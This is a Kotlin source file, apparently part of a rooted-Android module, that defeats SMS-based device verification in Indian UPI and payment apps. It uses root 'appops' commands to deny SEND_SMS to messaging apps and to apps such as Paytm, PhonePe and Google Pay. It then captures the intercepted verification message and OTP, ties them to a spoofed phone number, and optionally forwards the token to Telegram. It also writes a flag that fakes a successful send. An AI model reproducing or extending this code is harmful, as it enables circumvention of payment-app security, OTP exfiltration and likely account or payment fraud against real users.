package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log
import java.io.File

/**
 * Block real verify SMS from Messages / Phone / UPI apps — native ISms hook ke saath.
 */
object OutgoingSmsGuard {

    private const val TAG = "OutgoingSmsGuard"

    private val messagingPackages = listOf(
        "com.google.android.apps.messaging",
        "com.android.mms",
        "com.samsung.android.messaging",
        "com.android.mms.service"
    )

    private val upiSmsSenders = listOf(
        "com.kreditbee.android",
        "com.mobikwik_new",
        "net.one97.paytm",
        "com.phonepe.app",
        "com.google.android.apps.nbu.paisa.user",
        "com.stashfin.android",
        "com.yespay.next"
    )

    @Volatile
    private var blocked = false

    fun refresh(context: Context) {
        val configManager = ConfigManager(context)
        val config = configManager.load()
        val mockOn = config.enableVirtualSim || config.enableSim1Mock || config.enablePhoneSpoof
        val hookActive = config.hookedUpiApps.any { it.value } ||
            config.mockPhoneSim1.isNotBlank() ||
            configManager.readSpoofPhone().isNotBlank() ||
            mockOn
        val shouldBlock = (config.hookOutgoingSms || config.interceptFakeSuccess) && hookActive

        if (shouldBlock && !blocked) {
            blockMessagingSend()
            blocked = true
            Log.i(TAG, "SEND_SMS blocked — verify SMS spoof active")
        } else if (!shouldBlock && blocked) {
            restoreMessagingSend()
            blocked = false
            Log.i(TAG, "SEND_SMS restored")
        }

        processBlockedFlag(context)
    }

    private fun blockMessagingSend() {
        val packages = messagingPackages + listOf(
            "com.android.phone",
            "com.android.providers.telephony"
        ) + upiSmsSenders
        packages.forEach { pkg ->
            ShellHelper.runSu("appops set $pkg SEND_SMS deny 2>/dev/null")
        }
    }

    private fun restoreMessagingSend() {
        val packages = messagingPackages + listOf(
            "com.android.phone",
            "com.android.providers.telephony"
        ) + upiSmsSenders
        packages.forEach { pkg ->
            ShellHelper.runSu("appops set $pkg SEND_SMS allow 2>/dev/null")
        }
    }

    private fun processBlockedFlag(context: Context) {
        val flag = File("/data/local/tmp/hivirtus_outgoing_blocked.flag")
        if (!flag.canRead()) return
        try {
            val line = flag.readText().trim()
            if (line.isBlank()) return
            val parts = line.split("|", limit = 2)
            val dest = parts.getOrElse(0) { "" }
            val body = parts.getOrElse(1) { "" }
            if (dest.isBlank() || body.isBlank()) return

            val configManager = ConfigManager(context)
            val config = configManager.load()
            val app = SmsMatcher.matchedHookedApp(config, dest, body)
            val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
            val otp = LastOtp(
                otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
                sender = interceptDisplay,
                body = body,
                phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
                messageLabel = app?.displayName.orEmpty().ifBlank {
                    ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
                },
                direction = "outgoing",
                rawPeer = dest,
                capturedAt = System.currentTimeMillis()
            )
            OtpCaptureWriter.write(context, otp)
            OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
            if (SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")) {
                TokenForwarder(configManager, context).forward(otp)
            }
            try {
                File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
            } catch (_: Exception) {}
            flag.delete()
        } catch (e: Exception) {
            Log.w(TAG, "Blocked flag process failed: ${e.message}")
        }
    }
}
